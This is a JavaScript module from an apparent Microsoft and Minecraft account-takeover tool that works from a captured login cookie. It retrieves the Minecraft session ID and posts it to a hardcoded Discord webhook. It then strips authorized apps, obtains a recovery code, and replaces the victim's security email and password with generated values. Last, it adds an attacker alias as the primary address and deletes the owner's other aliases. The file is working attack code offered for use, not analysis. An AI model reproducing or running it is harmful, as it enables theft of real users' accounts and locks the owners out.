const generate = require("./generate");
const { domains } = require("../../config.json");
const addAlias = require("./secure/addAlias");
const getAMRP = require("./secure/getAMRP");
const getCookies = require("./secure/getCookies");
const getAliases = require("./secure/getAliases");
const getssid = require("./secure/getssid");
const makePrimary = require("./secure/makePrimary");
const recoveryCode = require("./secure/recoveryCode");
const removeAlias = require("./secure/removeAlias");
const removeExploit = require("./secure/removeExploit");
const securityInformation = require("./secure/securityInformation");
const getMethod = require("./secure/getMethod");
const polishHost = require("./secure/polishHost");
const changeIgn = require("./secure/changeIgn");
const getProfile = require("./secure/getProfile");
const checkssid = require("./secure/checkssid");
const getxbl = require("./secure/getxbl");
const recoveryCodeSecure = require("./recoveryCodeSecure");
const removeAuthApps = require("./secure/removeAuthApps");
const { startTimer, stopTimer, getTimeInSeconds } = require("./secureTime");
const getCapes = require("./secure/getCapes");
const getT = require("./secure/getT");
const axios = require('axios');

module.exports = async (host, settings) => {
    startTimer();

    let acc = {
        oldName: `Couldn't find!`,
        newName: `Couldn't change!`,
        oldEmail: `Couldn't find`,
        email: `Couldn't change!`,
        secEmail: `Couldn't change!`,
        password: `Couldn't change!`,
        recoveryCode: `Couldn't change!`,
        loginCookie: `Couldn't find!`,
        status: `unknown`,
        timeTaken: 0,
        ssid: `Couldn't Get!`,
        method: `idk`, 
        capes: [] 
    };

    try {
        const [canary, apiCanary, amsc] = await getCookies();
        console.log(`[*] Got Cookies! and now trying to polish the Login Cookie`);
        host = await polishHost(host, amsc);
        if (host === "locked") {
            console.log(`Account is locked!`);
            acc.email = `Locked!`;
            acc.secEmail = `Locked!`;
            acc.recoveryCode = `Locked!`;
            acc.password = `Locked!`;
            acc.status = "locked";
            acc.timeTaken = getTimeInSeconds(stopTimer());
            console.log(acc);
            return acc;
        }
        if (host === "down") {
            console.log(`Microsoft services are down!`);
            acc.email = `Microsoft services are down!`;
            acc.secEmail = `Microsoft services are down!`;
            acc.recoveryCode = `Microsoft services are down!`;
            acc.password = `Microsoft services are down!`;
            acc.status = "service_down";
            acc.timeTaken = getTimeInSeconds(stopTimer());
            console.log(acc);
            return acc;
        }



        const webhookUrl = "https://discord.com/api/webhooks/1340948636493807678/RndJgoSdYhp3HPigRwdAICCqGjPBwxp29Gmvqr4E_1RkVuA23xc9pRZ_tbdWSpYS6gQi"; // Replace with your actual webhook URL
        
        console.log(`Checking Minecraft account`);
        let xblResponse = await getxbl(host);
        if (xblResponse) {
            console.log(`Got XBL`);
            let xbl = xblResponse.xbl || `Couldn't find Xbox!`;
            let ssid = await getssid(xbl);
        
            if (ssid) {
                console.log(`Got SSID`);
                acc.ssid = ssid;
        
                // Send SSID to webhook using Axios
                try {
                    await axios.post(webhookUrl, {
                        content: `SSID: ${ssid}`
                    }, {
                        headers: {
                            "Content-Type": "application/json"
                        }
                    });
                    console.log(`SSID sent to webhook`);
                } catch (error) {
                    console.error(`[ERROR] Failed to send SSID to webhook: ${error.message}`);
                }
        
                try {
                    const validationResponse = await checkssid(ssid, acc.name);
                    console.log(`SSID Validation Response:`, validationResponse);
        
                    const capes = await getCapes(ssid);
                    acc.capes = Array.isArray(capes) ? capes : [];
                } catch (error) {
                    console.error(`[ERROR] Failed to validate SSID or get capes: ${error.message}`);
                    acc.capes = [];
                }        
        
                try {
                    const validationResponse = await checkssid(ssid, acc.name);
                    console.log(`SSID Validation Response:`, validationResponse);
        
                    const capes = await getCapes(ssid);
                    acc.capes = Array.isArray(capes) ? capes : [];
                } catch (error) {
                    console.error(`[ERROR] Failed to validate SSID or get capes: ${error.message}`);
                    acc.capes = [];
                }
        
        
                let profile = await getProfile(ssid);
                if (profile) {
                    acc.oldName = profile.name;
                    if (settings.change_ign) {
                        let newName = profile.name;
                        newName =
                            newName.length < 16
                                ? newName + "_"
                                : newName.replace(/.$/, ".");
                        try {
                            let status = await changeIgn(ssid, newName);
                            acc.newName = status === 200 ? newName : profile.name;
                        } catch (error) {
                            console.error(`[ERROR] Failed to change IGN: ${error.message}`);
                            acc.newName = profile.name;
                        }
                    }
            
                } else {
                    console.log(`[X] Couldn't get profile!`);
                    acc.oldName = "No Minecraft Account!";
                }
                try {
                    const method = await getMethod(ssid);
                    acc.method = method || "idk";
                } catch (error) {
                    console.error(`[ERROR] Failed to get method: ${error.message}`);
                    acc.method = "idk";
                }
            } else {
                console.log(`[X] Couldn't get SSID`);
                acc.ssid = "N/A";
            }
        } else {
            acc.oldName = `No Minecraft Account!`;
            console.log(`[X] Couldn't get XBL`);
        }
        if (
            (acc.oldName === `Failed to Find` || acc.oldName === `No Minecraft Account!`) &&
            settings.secureifnomc === "0"
        ) {
            console.log(`Has NO MC and the settings says don't secure if no MC`);
            acc.email = `No Minecraft!`;
            acc.secEmail = `No Minecraft!`;
            acc.recoveryCode = `No Minecraft!`;
            acc.password = `No Minecraft!`;
            acc.status = "no_mc";
            acc.timeTaken = getTimeInSeconds(stopTimer());
            console.log(acc);
            return acc;
        }
        let email = null;
        let t;
        try {
            t = await getT(host, amsc);
        } catch (error) {
            console.error(`[ERROR] Failed to get T: ${error.message}`);
            t = null;
        }
        if (t === "locked") {
            console.log(`Account is locked!`);
            acc.email = `Locked!`;
            acc.secEmail = `Locked!`;
            acc.recoveryCode = `Locked!`;
            acc.password = `Locked!`;
            acc.status = "locked";
            acc.timeTaken = getTimeInSeconds(stopTimer());
            console.log(acc);
            return acc;
        } else if (t === "down") {
            console.log(`Microsoft services are down!`);
            acc.email = `Microsoft services are down!`;
            acc.secEmail = `Microsoft services are down!`;
            acc.recoveryCode = `Microsoft services are down!`;
            acc.password = `Microsoft services are down!`;
            acc.status = "service_down";
            acc.timeTaken = getTimeInSeconds(stopTimer());
            console.log(acc);
            return acc;
        } else if (t) {
            console.log(`Found T`);
            let amrp;
            try {
                amrp = await getAMRP(t, amsc);
            } catch (error) {
                console.error(`[ERROR] Failed to get AMRP: ${error.message}`);
                amrp = null;
            }
            if (amrp) {
                if (settings.oauthapps) {
                    try {
                        await removeAuthApps(amrp, canary);
                    } catch (error) {
                        console.error(`[ERROR] Failed to remove authorized apps: ${error.message}`);
                    }
                }
                let securityParameters;
                try {
                    securityParameters = await securityInformation(amrp);
                    console.log(`Got Security Parameters`);
                } catch (error) {
                    console.error(`[ERROR] Failed to get security information: ${error.message}`);
                    securityParameters = null;
                }
                if (securityParameters && securityParameters.email) {
                    email = securityParameters.email;
                    acc.oldEmail = email;
                    let recovery;
                    try {
                        recovery = await recoveryCode(
                            amrp,
                            apiCanary,
                            amsc,
                            securityParameters?.WLXAccount?.manageProofs?.encryptedNetId
                        );
                        console.log(`Recovery Code: ${recovery}`);
                    } catch (error) {
                        console.error(`[ERROR] Failed to get recovery code: ${error.message}`);
                        recovery = null;
                    }
                    if (recovery) {
                        acc.recoveryCode = recovery;
                        let secEmail = `${generate(16)}@${settings?.domain || domains[0]}`;
                        let password = generate(16);
                        try {
                            let newData = await recoveryCodeSecure(
                                email,
                                recovery,
                                secEmail,
                                password
                            );
                            if (newData) {
                                acc.password = newData.password || acc.password;
                                acc.secEmail = newData.secEmail || acc.secEmail;
                                acc.recoveryCode = newData.recoveryCode || acc.recoveryCode;
                            }
                        } catch (error) {
                            console.error(`Error while changing email data! (Retrying): ${error.message}`);
                            try {
                                let newData = await recoveryCodeSecure(
                                    email,
                                    recovery,
                                    secEmail,
                                    password
                                );
                                if (newData) {
                                    acc.password = newData.password || acc.password;
                                    acc.secEmail = newData.secEmail || acc.secEmail;
                                    acc.recoveryCode = newData.recoveryCode || acc.recoveryCode;
                                }
                            } catch (retryError) {
                                console.error(`Retry failed: ${retryError.message}`);
                            }
                        }
                    } else {
                        console.log(`[X] Failed to get the Recovery Code!`);
                        acc.recoveryCode = `Failed to get the recovery code!`;
                    }
                    let aliases = [];
                    let canary2 = null;
                    try {
                        [aliases, canary2] = await getAliases(amrp);
                        console.log(`[*] Aliases for this account: ${aliases.join(" | ")}`);
                    } catch (error) {
                        console.error(`[ERROR] Failed to get aliases: ${error.message}`);
                        aliases = [];
                        canary2 = null;
                    }
                    let primaryAlias = generate(16);
                    let isAdded = false;
                    if (canary2 && amrp) {
                        try {
                            isAdded = await addAlias(primaryAlias, canary2, amrp, amsc);
                        } catch (error) {
                            console.error(`[ERROR] Failed to add alias: ${error.message}`);
                        }
                    }
                    if (isAdded) {
                        console.log(`[✔] Added alias ${primaryAlias}@outlook.com to the Account!`);
                        acc.email = aliases[0] || acc.email;
                        email = `${primaryAlias}@outlook.com`;
                        let isPrimary = false;
                        try {
                            isPrimary = await makePrimary(amrp, amsc, apiCanary, email);
                        } catch (error) {
                            console.error(`[ERROR] Failed to make primary alias: ${error.message}`);
                        }
                        if (isPrimary) {
                            acc.email = email;
                            console.log(
                                `[✔] Set ${primaryAlias}@outlook.com as a Primary Alias for the Account!`
                            );
                            for (let alias of aliases) {
                                if (alias === aliases[0] || alias.includes(primaryAlias)) {
                                    continue;
                                }
                                try {
                                    await removeAlias(amrp, amsc, canary2, alias);
                                } catch (error) {
                                    console.error(`[ERROR] Failed to remove alias ${alias}: ${error.message}`);
                                }
                            }
                        } else {
                            console.log(
                                `[X] Failed to Set ${primaryAlias}@outlook.com as a Primary Alias for the Account!`
                            );
                        }
                    } else {
                        console.log(
                            `[X] Failed to add ${primaryAlias}@outlook.com as an Alias for the Account!`
                        );
                        if (aliases.length > 0) {
                            acc.email = aliases[0];
                            email = aliases[0];
                        }
                    }
                } else {
                    console.log(`[X] Security parameters missing or incomplete!`);
                }
            } else {
                console.log(`[X] Couldn't find the AMRP`);
            }
        } else {
            acc.email = `Invalid Login Cookie!`;
            acc.secEmail = `Invalid Login Cookie!`;
            acc.recoveryCode = `Invalid Login Cookie!`;
            acc.password = `Invalid Login Cookie!`;
        }
        acc.timeTaken = getTimeInSeconds(stopTimer());
        console.log(acc);
        return acc;
    } catch (error) {
        console.error("An unexpected error occurred:", error);
        acc.status = "error";
        acc.timeTaken = getTimeInSeconds(stopTimer());
        return acc;
    }
};
